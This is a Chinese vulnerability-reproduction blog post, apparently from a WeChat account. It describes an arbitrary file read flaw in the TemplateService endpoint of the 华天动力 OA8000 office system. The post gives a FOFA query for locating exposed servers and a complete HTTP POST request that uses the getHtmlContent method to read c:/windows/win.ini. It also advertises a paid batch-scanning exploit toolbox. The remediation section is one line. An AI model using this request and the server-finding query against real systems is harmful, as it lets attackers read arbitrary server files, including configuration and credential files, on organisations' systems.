#  华天动力OA8000办公系统TemplateService存在任意文件读取漏洞   
南风徐来  南风漏洞复现文库   2024-03-24 22:48  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 华天动力OA8000办公系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
华天动力OA8000办公系统  
## 2.漏洞描述  
  
华天动力是我国首批OA企业,是双软认证的高新技术企业,专注OA办公系统20余年,开放免费OA系统下载试用,旗下OA产品累计为37500多个客户提供高效OA办公体验,为各类政府企业提供高端高效OA系统产品,华天动力OA8000办公系统TemplateService存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
华天动力OA8000办公系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7ojam9TD2Dcjv985XrRAic8nWQr6Sv8ejHSvicwchvqY4yia9zRuVbSkjw/640?wx_fmt=jpeg&from=appmsg "null")  
  
华天动力OA8000办公系统TemplateService存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="华天动力-OA8000"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/OAapp/bfapp/buffalo/TemplateService  
  
漏洞数据包：  
```
POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: 127.0.0.1
Content-Length: 101
Expect: 100-continue
Connection: close

<buffalo-call>
<method>getHtmlContent</method>
<string>c:/windows/win.ini</string>
</buffalo-call>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7pzbNbLhlulPJ90gzD8m2DbYjY9icff02CBp0aMRQrROTxHibRuuDlQXA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7JDlTPb6lD2NKUgZu4N0eZY57PzemWaMkj2RvSM7pwCTJIKmibqgCdjg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7ljneePgic20UKn9Okic5xMQXXQoCAATgFhXlwgcBTzszQBlXAgQL8iarQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7qicBjUzBN3Ma9UjcAwZjjM92lP0RHv82qhqehjleYkKmzXbepqYHJFw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7my9hHclW3UsB8hYhQbvhVgZRjeicQX54YKLtWK4TC87n6tyyrqQnomg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZSD2k8iaoujmhLU2sWGxWh7w4BL5aLyTx9k4LuhMY0WD8ATJcgSicnuSdiczWtcKia8xPmdu9uIpYhEA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系官方更新补丁：https://www.oa8000.com/  
## 8.往期回顾  
  
[云时空社会化商业ERP存在shiro反序列化远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485877&idx=1&sn=ea8287d6d5649e82a37c22353ec0d535&chksm=974b84b2a03c0da4c91938c82cc58d28b7555eaa469a2ee0aed4e1ca152b564fed91c1f1254d&scene=21#wechat_redirect)  
  
  
[飞鱼星智能上网行为管理系统send_order接口存在远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485877&idx=2&sn=1d608c1e7729ce9c72a47eb23eea8fdb&chksm=974b84b2a03c0da49d6e9e688cafb8610c0bab23fcd02e3af4d2af955e2f209a7f2707dcd079&scene=21#wechat_redirect)  
  
  
  
  
